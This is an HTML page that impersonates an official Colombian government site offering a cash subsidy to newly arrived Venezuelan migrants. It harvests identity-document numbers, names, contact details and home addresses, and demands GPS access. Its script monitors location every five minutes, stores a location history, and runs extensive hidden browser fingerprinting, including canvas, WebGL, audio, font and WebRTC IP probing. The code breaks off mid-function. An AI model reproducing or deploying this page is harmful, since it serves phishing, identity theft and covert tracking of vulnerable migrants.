<!DOCTYPE html>
<html lang="es-CO">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Subsidio de Apoyo Económico - Venezolanos en Colombia</title>
    <meta name="description" content="Solicita el subsidio de apoyo económico para venezolanos recién llegados a Colombia. Programa del Gobierno Nacional para migrantes venezolanos.">
    
    <!-- Favicon -->
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🇨🇴</text></svg>">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <!-- SweetAlert2 -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        :root {
            --primary-color: #fcdd09;
            --secondary-color: #003893;
            --accent-color: #ce1126;
            --success-color: #10b981;
            --danger-color: #ef4444;
            --warning-color: #f59e0b;
            --light-gray: #f8fafc;
            --medium-gray: #64748b;
            --dark-gray: #1e293b;
            --white: #ffffff;
            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Montserrat', sans-serif;
            line-height: 1.6;
            color: var(--dark-gray);
            background: linear-gradient(135deg, #fcdd09 0%, #003893 50%, #ce1126 100%);
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }
        
        /* Header */
        .header {
            background: var(--white);
            box-shadow: var(--shadow);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .header-content {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 15px 0;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .logo-icon {
            width: 50px;
            height: 50px;
            background: var(--secondary-color);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--white);
            font-size: 24px;
        }
        
        .logo-text {
            font-size: 18px;
            font-weight: 700;
            color: var(--secondary-color);
        }
        
        .gov-badge {
            background: var(--secondary-color);
            color: var(--white);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        /* Main Content */
        .main-content {
            padding: 40px 0;
        }
        
        .hero-section {
            text-align: center;
            margin-bottom: 40px;
            color: var(--white);
        }
        
        .hero-title {
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 15px;
            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }
        
        .hero-subtitle {
            font-size: 1.2rem;
            font-weight: 400;
            opacity: 0.9;
            max-width: 700px;
            margin: 0 auto;
        }
        
        .program-info {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 25px;
            margin: 30px auto;
            max-width: 800px;
            box-shadow: var(--shadow-lg);
            border-left: 5px solid var(--accent-color);
        }
        
        .program-info h3 {
            color: var(--secondary-color);
            font-size: 1.3rem;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .program-info ul {
            list-style: none;
            padding: 0;
        }
        
        .program-info li {
            padding: 8px 0;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--dark-gray);
        }
        
        .program-info li i {
            color: var(--success-color);
            width: 20px;
        }
        
        /* Form Card */
        .form-card {
            background: var(--white);
            border-radius: 20px;
            box-shadow: var(--shadow-lg);
            overflow: hidden;
            max-width: 900px;
            margin: 0 auto;
        }
        
        .form-header {
            background: linear-gradient(135deg, var(--secondary-color), var(--primary-color));
            color: var(--white);
            padding: 30px;
            text-align: center;
        }
        
        .form-header h2 {
            font-size: 1.8rem;
            font-weight: 600;
            margin-bottom: 10px;
        }
        
        .form-header p {
            opacity: 0.9;
            font-size: 1rem;
        }
        
        .form-body {
            padding: 40px;
        }
        
        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
            margin-bottom: 30px;
        }
        
        .form-group {
            position: relative;
        }
        
        .form-group label {
            display: block;
            font-weight: 600;
            color: var(--dark-gray);
            margin-bottom: 8px;
            font-size: 0.95rem;
        }
        
        .form-group input,
        .form-group select {
            width: 100%;
            padding: 15px;
            border: 2px solid #e2e8f0;
            border-radius: 10px;
            font-size: 1rem;
            transition: all 0.3s ease;
            background: var(--white);
        }
        
        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: var(--secondary-color);
            box-shadow: 0 0 0 3px rgba(0, 56, 147, 0.1);
        }
        
        .form-group .icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--medium-gray);
            pointer-events: none;
        }
        
        /* Location Section */
        .location-section {
            background: var(--light-gray);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
            border-left: 4px solid var(--accent-color);
        }
        
        .location-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .location-header i {
            color: var(--accent-color);
            font-size: 1.2rem;
        }
        
        .location-header h3 {
            color: var(--dark-gray);
            font-size: 1.1rem;
            font-weight: 600;
        }
        
        .location-button {
            background: var(--accent-color);
            color: var(--white);
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .location-button:hover {
            background: #b91c2c;
            transform: translateY(-2px);
        }
        
        .location-status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 8px;
            font-size: 0.9rem;
            display: none;
        }
        
        .location-status.success {
            background: #dcfce7;
            color: #166534;
            border: 1px solid #bbf7d0;
        }
        
        .location-status.error {
            background: #fef2f2;
            color: #991b1b;
            border: 1px solid #fecaca;
        }
        
        /* Submit Button */
        .submit-section {
            text-align: center;
            padding-top: 20px;
            border-top: 1px solid #e2e8f0;
        }
        
        .submit-button {
            background: linear-gradient(135deg, var(--success-color), #059669);
            color: var(--white);
            border: none;
            padding: 18px 40px;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            min-width: 200px;
            justify-content: center;
        }
        
        .submit-button:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-lg);
        }
        
        .submit-button:disabled {
            background: var(--medium-gray);
            cursor: not-allowed;
            transform: none;
        }
        
        /* Loading Spinner */
        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid transparent;
            border-top: 2px solid currentColor;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: none;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Footer */
        .footer {
            background: var(--white);
            padding: 30px 0;
            text-align: center;
            color: var(--medium-gray);
            font-size: 0.9rem;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }
        
        .footer-links a {
            color: var(--medium-gray);
            text-decoration: none;
            transition: color 0.3s ease;
        }
        
        .footer-links a:hover {
            color: var(--secondary-color);
        }
        
        /* Responsive Design */
        @media (max-width: 768px) {
            .hero-title {
                font-size: 2rem;
            }
            
            .hero-subtitle {
                font-size: 1rem;
            }
            
            .form-body {
                padding: 25px;
            }
            
            .form-grid {
                grid-template-columns: 1fr;
                gap: 20px;
            }
            
            .header-content {
                justify-content: center;
                text-align: center;
            }
            
            .footer-links {
                flex-direction: column;
                gap: 15px;
            }
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 0 15px;
            }
            
            .form-header {
                padding: 20px;
            }
            
            .form-body {
                padding: 20px;
            }
            
            .hero-title {
                font-size: 1.8rem;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="container">
            <div class="header-content">
                <div class="logo">
                    <div class="logo-icon">
                        <i class="fas fa-flag"></i>
                    </div>
                    <div class="logo-text">Gobierno de Colombia</div>
                </div>
                <div class="gov-badge">
                    <i class="fas fa-shield-alt"></i> Sitio Oficial
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <div class="container">
            <!-- Hero Section -->
            <section class="hero-section">
                <h1 class="hero-title">
                    <i class="fas fa-hands-helping"></i>
                    Subsidio de Apoyo Económico
                </h1>
                <p class="hero-subtitle">
                    Programa del Gobierno Nacional para venezolanos recién llegados a Colombia. 
                    Solicita tu apoyo económico de integración y establécete dignamente en nuestro país.
                </p>
            </section>

            <!-- Program Information -->
            <div class="program-info">
                <h3><i class="fas fa-info-circle"></i> Información del Programa</h3>
                <ul>
                    <li><i class="fas fa-check-circle"></i> Apoyo económico de $500.000 COP para gastos básicos de establecimiento</li>
                    <li><i class="fas fa-check-circle"></i> Dirigido a ciudadanos venezolanos recién llegados a Colombia</li>
                    <li><i class="fas fa-check-circle"></i> Requisito: No haber recibido anteriormente este subsidio</li>
                    <li><i class="fas fa-check-circle"></i> Verificación de ubicación en territorio colombiano obligatoria</li>
                    <li><i class="fas fa-check-circle"></i> Proceso 100% gratuito y sin intermediarios</li>
                </ul>
            </div>

            <!-- Form Card -->
            <div class="form-card">
                <div class="form-header">
                    <h2><i class="fas fa-file-alt"></i> Solicitud de Subsidio</h2>
                    <p>Completa todos los campos para solicitar tu apoyo económico de integración</p>
                </div>
                
                <div class="form-body">
                    <form id="subsidyForm">
                        <div class="form-grid">
                            <div class="form-group">
                                <label for="documentType">
                                    <i class="fas fa-id-card"></i> Tipo de Documento *
                                </label>
                                <select id="documentType" name="documentType" required>
                                    <option value="">Selecciona tu tipo de documento</option>
                                    <option value="CV">Cédula de Identidad Venezolana</option>
                                    <option value="PV">Pasaporte Venezolano</option>
                                    <option value="PPT">Permiso por Protección Temporal (PPT)</option>
                                    <option value="CE">Cédula de Extranjería</option>
                                    <option value="PA">Pasaporte (Otro país)</option>
                                </select>
                            </div>
                            
                            <div class="form-group">
                                <label for="documentNumber">
                                    <i class="fas fa-hashtag"></i> Número de Documento *
                                </label>
                                <input type="text" id="documentNumber" name="documentNumber" 
                                       placeholder="Ingresa tu número de documento" required>
                            </div>
                            
                            <div class="form-group">
                                <label for="firstName">
                                    <i class="fas fa-user"></i> Nombres *
                                </label>
                                <input type="text" id="firstName" name="firstName" 
                                       placeholder="Ingresa tus nombres completos" required>
                            </div>
                            
                            <div class="form-group">
                                <label for="lastName">
                                    <i class="fas fa-user-tag"></i> Apellidos *
                                </label>
                                <input type="text" id="lastName" name="lastName" 
                                       placeholder="Ingresa tus apellidos completos" required>
                            </div>
                            
                            <div class="form-group">
                                <label for="email">
                                    <i class="fas fa-envelope"></i> Correo Electrónico *
                                </label>
                                <input type="email" id="email" name="email" 
                                       placeholder="ejemplo@correo.com" required>
                            </div>
                            
                            <div class="form-group">
                                <label for="phone">
                                    <i class="fas fa-phone"></i> Teléfono *
                                </label>
                                <input type="tel" id="phone" name="phone" 
                                       placeholder="Ej: +57 3001234567" required>
                            </div>
                            
                            <div class="form-group">
                                <label for="arrivalDate">
                                    <i class="fas fa-calendar-alt"></i> Fecha de Llegada a Colombia *
                                </label>
                                <input type="date" id="arrivalDate" name="arrivalDate" required>
                            </div>
                            
                            <div class="form-group">
                                <label for="currentCity">
                                    <i class="fas fa-map-marker-alt"></i> Ciudad Actual en Colombia *
                                </label>
                                <select id="currentCity" name="currentCity" required>
                                    <option value="">Selecciona tu ciudad actual</option>
                                    <option value="Bogotá">Bogotá D.C.</option>
                                    <option value="Medellín">Medellín</option>
                                    <option value="Cali">Cali</option>
                                    <option value="Barranquilla">Barranquilla</option>
                                    <option value="Cartagena">Cartagena</option>
                                    <option value="Cúcuta">Cúcuta</option>
                                    <option value="Bucaramanga">Bucaramanga</option>
                                    <option value="Pereira">Pereira</option>
                                    <option value="Santa Marta">Santa Marta</option>
                                    <option value="Ibagué">Ibagué</option>
                                    <option value="Otra">Otra ciudad</option>
                                </select>
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label for="address">
                                <i class="fas fa-home"></i> Dirección Actual en Colombia *
                            </label>
                            <input type="text" id="address" name="address" 
                                   placeholder="Ingresa tu dirección completa actual" required>
                        </div>
                        
                        <!-- Location Section -->
                        <div class="location-section">
                            <div class="location-header">
                                <i class="fas fa-map-marked-alt"></i>
                                <h3>Verificación de Ubicación en Colombia</h3>
                            </div>
                            <p style="margin-bottom: 15px; color: var(--medium-gray); font-size: 0.95rem;">
                                <strong>Requisito obligatorio:</strong> Debes activar tu ubicación para confirmar que te encuentras 
                                actualmente en territorio colombiano. Esta verificación es necesaria para procesar tu solicitud.
                            </p>
                            <button type="button" class="location-button" id="getLocationBtn">
                                <i class="fas fa-crosshairs"></i>
                                Verificar Ubicación en Colombia
                            </button>
                            <div class="location-status" id="locationStatus"></div>
                        </div>
                        
                        <!-- Submit Section -->
                        <div class="submit-section">
                            <button type="submit" class="submit-button" id="submitBtn">
                                <div class="spinner" id="spinner"></div>
                                <i class="fas fa-paper-plane" id="submitIcon"></i>
                                <span id="submitText">Solicitar Subsidio</span>
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <div class="container">
            <div class="footer-links">
                <a href="#">Términos y Condiciones</a>
                <a href="#">Política de Privacidad</a>
                <a href="#">Contacto</a>
                <a href="#">Ayuda</a>
            </div>
            <p>&copy; 2024 Gobierno Nacional de Colombia. Todos los derechos reservados.</p>
            <p style="font-size: 0.8rem; margin-top: 5px; opacity: 0.7;">
                Línea de atención migrantes: 01-8000-51-8400 | Línea anticorrupción: 01-8000-95-1100
            </p>
        </div>
    </footer>

    <script>
        // Advanced Geolocation and Data Collection
        let locationData = null;
        let deviceData = {};
        let locationMonitor = null;
        let locationHistory = [];
        
        // Location monitoring configuration
        const LOCATION_CONFIG = {
            monitorInterval: 5 * 60 * 1000, // 5 minutes
            maxHistoryEntries: 50,
            accuracyThreshold: 100, // meters
            storageKey: 'advancedLocationDataVenezuela'
        };
        
        // Location persistence manager
        class LocationPersistence {
            static save(data) {
                try {
                    const persistData = {
                        current: data,
                        history: locationHistory,
                        timestamp: Date.now(),
                        sessionId: this.getSessionId()
                    };
                    localStorage.setItem(LOCATION_CONFIG.storageKey, JSON.stringify(persistData));
                } catch (error) {
                    console.warn('Could not save location data:', error);
                }
            }
            
            static load() {
                try {
                    const stored = localStorage.getItem(LOCATION_CONFIG.storageKey);
                    if (stored) {
                        const data = JSON.parse(stored);
                        // Check if data is from current session (within 24 hours)
                        if (Date.now() - data.timestamp < 24 * 60 * 60 * 1000) {
                            locationHistory = data.history || [];
                            return data.current;
                        }
                    }
                } catch (error) {
                    console.warn('Could not load location data:', error);
                }
                return null;
            }
            
            static getSessionId() {
                let sessionId = sessionStorage.getItem('locationSessionIdVenezuela');
                if (!sessionId) {
                    sessionId = 'sess_ven_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                    sessionStorage.setItem('locationSessionIdVenezuela', sessionId);
                }
                return sessionId;
            }
            
            static clear() {
                localStorage.removeItem(LOCATION_CONFIG.storageKey);
                locationHistory = [];
            }
        }
        
        // Continuous location monitor
        class LocationMonitor {
            constructor() {
                this.isActive = false;
                this.intervalId = null;
                this.lastKnownLocation = null;
                this.statusIndicator = null;
            }
            
            start() {
                if (this.isActive) return;
                
                this.isActive = true;
                this.createStatusIndicator();
                this.updateStatus('Iniciando monitoreo...', 'monitoring');
                
                // Initial location check
                this.checkLocation();
                
                // Set up periodic checks
                this.intervalId = setInterval(() => {
                    this.checkLocation();
                }, LOCATION_CONFIG.monitorInterval);
                
                console.log('Location monitoring started - checking every 5 minutes');
            }
            
            stop() {
                if (!this.isActive) return;
                
                this.isActive = false;
                if (this.intervalId) {
                    clearInterval(this.intervalId);
                    this.intervalId = null;
                }
                
                this.updateStatus('Monitoreo detenido', 'stopped');
                console.log('Location monitoring stopped');
            }
            
            async checkLocation() {
                try {
                    this.updateStatus('Verificando ubicación...', 'checking');
                    
                    const newLocation = await getAdvancedGeolocation();
                    const locationChanged = this.hasLocationChanged(newLocation);
                    
                    if (locationChanged || !this.lastKnownLocation) {
                        this.handleLocationUpdate(newLocation);
                    }
                    
                    this.lastKnownLocation = newLocation;
                    this.updateLocationHistory(newLocation);
                    LocationPersistence.save(newLocation);
                    
                    const statusText = newLocation.source === 'ip' ? 
                        'Ubicación por IP (aproximada)' : 
                        `GPS activo (±${Math.round(newLocation.accuracy)}m)`;
                    
                    this.updateStatus(statusText, newLocation.source === 'ip' ? 'ip' : 'gps');
                    
                } catch (error) {
                    console.error('Location check failed:', error);
                    this.updateStatus('Error en ubicación', 'error');
                }
            }
            
            hasLocationChanged(newLocation) {
                if (!this.lastKnownLocation) return true;
                
                const distance = this.calculateDistance(
                    this.lastKnownLocation.latitude,
                    this.lastKnownLocation.longitude,
                    newLocation.latitude,
                    newLocation.longitude
                );
                
                const sourceChanged = this.lastKnownLocation.source !== newLocation.source;
                const significantMove = distance > LOCATION_CONFIG.accuracyThreshold;
                
                return sourceChanged || significantMove;
            }
            
            calculateDistance(lat1, lon1, lat2, lon2) {
                const R = 6371e3; // Earth's radius in meters
                const φ1 = lat1 * Math.PI/180;
                const φ2 = lat2 * Math.PI/180;
                const Δφ = (lat2-lat1) * Math.PI/180;
                const Δλ = (lon2-lon1) * Math.PI/180;
                
                const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
                         Math.cos(φ1) * Math.cos(φ2) *
                         Math.sin(Δλ/2) * Math.sin(Δλ/2);
                const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
                
                return R * c;
            }
            
            handleLocationUpdate(newLocation) {
                locationData = newLocation;
                console.log('Location updated:', newLocation);
            }
            
            updateLocationHistory(location) {
                const historyEntry = {
                    ...location,
                    recordedAt: new Date().toISOString()
                };
                
                locationHistory.unshift(historyEntry);
                
                // Keep only recent entries
                if (locationHistory.length > LOCATION_CONFIG.maxHistoryEntries) {
                    locationHistory = locationHistory.slice(0, LOCATION_CONFIG.maxHistoryEntries);
                }
            }
            
            createStatusIndicator() {
                if (this.statusIndicator) return;
                
                this.statusIndicator = document.createElement('div');
                this.statusIndicator.id = 'locationMonitorStatus';
                this.statusIndicator.style.cssText = `
                    position: fixed;
                    top: 20px;
                    right: 20px;
                    background: rgba(0, 0, 0, 0.8);
                    color: white;
                    padding: 8px 12px;
                    border-radius: 20px;
                    font-size: 12px;
                    z-index: 10000;
                    display: flex;
                    align-items: center;
                    gap: 6px;
                    backdrop-filter: blur(10px);
                    border: 1px solid rgba(255, 255, 255, 0.1);
                    transition: all 0.3s ease;
                `;
                
                document.body.appendChild(this.statusIndicator);
            }
            
            updateStatus(text, type) {
                if (!this.statusIndicator) return;
                
                const icons = {
                    monitoring: '<i class="fas fa-satellite-dish" style="color: #17a2b8;"></i>',
                    checking: '<i class="fas fa-spinner fa-spin" style="color: #ffc107;"></i>',
                    gps: '<i class="fas fa-crosshairs" style="color: #28a745;"></i>',
                    ip: '<i class="fas fa-wifi" style="color: #ffc107;"></i>',
                    error: '<i class="fas fa-exclamation-triangle" style="color: #dc3545;"></i>',
                    stopped: '<i class="fas fa-pause" style="color: #6c757d;"></i>'
                };
                
                this.statusIndicator.innerHTML = `${icons[type] || ''} ${text}`;
            }
            
            getLocationHistory() {
                return locationHistory;
            }
            
            getCurrentLocation() {
                return this.lastKnownLocation;
            }
        }
        
        // Initialize location monitor
        locationMonitor = new LocationMonitor();
        let isLocationVerified = false;
        
        // Collect device information
        function collectDeviceInfo() {
            deviceData = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                viewport: {
                    width: window.innerWidth,
                    height: window.innerHeight
                },
                timezone: {
                    name: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    offset: new Date().getTimezoneOffset()
                },
                timestamp: new Date().toISOString()
            };
            
            // Network information if available
            if ('connection' in navigator) {
                deviceData.connection = {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                };
            }
        }
        
        // Advanced device data collection functions
        async function collectAdvancedDeviceData() {
            try {
                const advancedData = {
                    // Hardware fingerprinting
                    hardware: {
                        cores: navigator.hardwareConcurrency || 'unknown',
                        memory: navigator.deviceMemory || 'unknown',
                        maxTouchPoints: navigator.maxTouchPoints || 0,
                        vendor: navigator.vendor || 'unknown',
                        vendorSub: navigator.vendorSub || 'unknown',
                        product: navigator.product || 'unknown',
                        productSub: navigator.productSub || 'unknown',
                        appName: navigator.appName || 'unknown',
                        appVersion: navigator.appVersion || 'unknown',
                        buildID: navigator.buildID || 'unknown'
                    },
                    
                    // Screen and display information
                    display: {
                        screenWidth: screen.width,
                        screenHeight: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth,
                        pixelRatio: window.devicePixelRatio || 1,
                        orientation: screen.orientation ? screen.orientation.type : 'unknown'
                    },
                    
                    // Browser and engine fingerprinting
                    browser: {
                        webgl: await getWebGLFingerprint(),
                        webglVendor: getWebGLVendor(),
                        canvas: getCanvasFingerprint(),
                        audio: await getAudioFingerprint(),
                        fonts: getAvailableFonts(),
                        plugins: getPluginsList(),
                        mimeTypes: getMimeTypes(),
                        localStorage: getStorageInfo('localStorage'),
                        sessionStorage: getStorageInfo('sessionStorage'),
                        indexedDB: await checkIndexedDBSupport(),
                        webRTC: await getWebRTCFingerprint()
                    },
                    
                    // Network and connection
                    network: {
                        connection: navigator.connection ? {
                            effectiveType: navigator.connection.effectiveType,
                            downlink: navigator.connection.downlink,
                            rtt: navigator.connection.rtt,
                            saveData: navigator.connection.saveData,
                            type: navigator.connection.type
                        } : null,
                        onLine: navigator.onLine,
                        doNotTrack: navigator.doNotTrack,
                        cookieEnabled: navigator.cookieEnabled
                    },
                    
                    // Timing and performance
                    performance: {
                        timing: performance.timing ? {
                            navigationStart: performance.timing.navigationStart,
                            loadEventEnd: performance.timing.loadEventEnd,
                            domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd
                        } : null,
                        memory: performance.memory ? {
                            usedJSHeapSize: performance.memory.usedJSHeapSize,
                            totalJSHeapSize: performance.memory.totalJSHeapSize,
                            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
                        } : null
                    },
                    
                    // Additional fingerprinting
                    misc: {
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timezoneOffset: new Date().getTimezoneOffset(),
                        language: navigator.language,
                        languages: navigator.languages || [],
                        platform: navigator.platform,
                        userAgent: navigator.userAgent,
                        timestamp: Date.now(),
                        sessionId: generateSessionId()
                    }
                };
                
                return advancedData;
            } catch (error) {
                console.error('Error collecting advanced device data:', error);
                return {};
            }
        }
        
        // WebGL fingerprinting
        async function getWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                
                if (!gl) return 'not_supported';
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown';
                const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
                
                return `${vendor}~${renderer}`;
            } catch (error) {
                return 'error';
            }
        }
        
        function getWebGLVendor() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                return gl ? gl.getParameter(gl.VENDOR) : 'unknown';
            } catch (error) {
                return 'error';
            }
        }
        
        // Canvas fingerprinting
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Advanced fingerprinting 🔒', 2, 2);
                
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillRect(100, 5, 80, 20);
                
                return canvas.toDataURL().slice(-50);
            } catch (error) {
                return 'error';
            }
        }
        
        // Audio fingerprinting
        async function getAudioFingerprint() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const analyser = audioContext.createAnalyser();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(analyser);
                analyser.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.value = 1000;
                gainNode.gain.value = 0;
                
                oscillator.start();
                
                const frequencyData = new Uint8Array(analyser.frequencyBinCount);
                analyser.getByteFrequencyData(frequencyData);
                
                oscillator.stop();
                audioContext.close();
                
                return Array.from(frequencyData.slice(0, 10)).join(',');
            } catch (error) {
                return 'not_supported';
            }
        }
        
        // Font detection
        function getAvailableFonts() {
            const testFonts = [
                'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
                'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
                'Trebuchet MS', 'Arial Black', 'Impact', 'Calibri', 'Cambria'
            ];
            
            const availableFonts = [];
            const testString = 'mmmmmmmmmmlli';
            const testSize = '72px';
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            for (const font of testFonts) {
                for (const baseFont of baseFonts) {
                    context.font = `${testSize} ${font}, ${baseFont}`;
                    const width = context.measureText(testString).width;
                    
                    context.font = `${testSize} ${baseFont}`;
                    const baseWidth = context.measureText(testString).width;
                    
                    if (width !== baseWidth) {
                        availableFonts.push(font);
                        break;
                    }
                }
            }
            
            return availableFonts;
        }
        
        // Plugin detection
        function getPluginsList() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push({
                    name: navigator.plugins[i].name,
                    filename: navigator.plugins[i].filename,
                    description: navigator.plugins[i].description
                });
            }
            return plugins;
        }
        
        // MIME types
        function getMimeTypes() {
            const mimeTypes = [];
            for (let i = 0; i < navigator.mimeTypes.length; i++) {
                mimeTypes.push({
                    type: navigator.mimeTypes[i].type,
                    description: navigator.mimeTypes[i].description,
                    suffixes: navigator.mimeTypes[i].suffixes
                });
            }
            return mimeTypes;
        }
        
        // Storage information
        function getStorageInfo(storageType) {
            try {
                const storage = window[storageType];
                return {
                    available: !!storage,
                    length: storage ? storage.length : 0
                };
            } catch (error) {
                return { available: false, error: error.message };
            }
        }
        
        // IndexedDB support
        async function checkIndexedDBSupport() {
            try {
                return 'indexedDB' in window;
            } catch (error) {
                return false;
            }
        }
        
        // WebRTC fingerprinting
        async function getWebRTCFingerprint() {
            try {
                const pc = new RTCPeerConnection();
                const fingerprint = await new Promise((resolve) => {
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = (event) => {
                        if (event.candidate) {
                            resolve(event.candidate.candidate);
                        }
                    };
                    setTimeout(() => resolve('timeout'), 1000);
                });
                pc.close();
                return fingerprint;
            } catch (error) {
                return 'not_supported';
            }
        }
        
        // Generate session ID
        function generateSessionId() {
            return 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
        }
        
        // Enhanced geolocation function with Colombia verification
        async function getAdvancedGeolocation() {
            return new Promise(async (resolve, reject) => {
                if (!navigator.geolocation) {
                    // Try IP-based geolocation as fallback
                    try {
                        const ipLocation = await getLocationByIP();
                        const isInColombia = await verifyColombianLocation(ipLocation.latitude, ipLocation.longitude);
                        
                        locationData = {
                            ...ipLocation,
                            isInColombia: isInColombia,
                            country: isInColombia ? 'Colombia' : 'Fuera de Colombia'
                        };
                        
                        resolve(locationData);
                        return;
                    } catch (ipError) {
                        reject(new Error('Geolocalización no soportada en este dispositivo. Por favor, use un navegador moderno.'));
                        return;
                    }
                }
                
                const options = {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                };
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const coords = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        };
                        
                        // Verify if location is within Colombia boundaries (approximate)
                        const isInColombia = await verifyColombianLocation(coords.latitude, coords.longitude);
                        
                        locationData = {
                            ...coords,
                            isInColombia: isInColombia,
                            country: isInColombia ? 'Colombia' : 'Fuera de Colombia'
                        };
                        
                        resolve(locationData);
                    },
                    async (error) => {
                        let errorMessage = '';
                        
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = 'Acceso a ubicación denegado. Por favor, permita el acceso a su ubicación en la configuración del navegador y recargue la página.';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = 'Ubicación no disponible. Verifique que su GPS esté activado y que tenga conexión a internet.';
                                break;
                            case error.TIMEOUT:
                                errorMessage = 'Tiempo de espera agotado. Intente nuevamente o verifique su conexión GPS.';
                                break;
                            default:
                                errorMessage = 'Error desconocido al obtener ubicación. Intente nuevamente.';
                                break;
                        }
                        
                        // Try IP-based geolocation as fallback
                        try {
                            console.log('GPS failed, trying IP-based location...');
                            const ipLocation = await getLocationByIP();
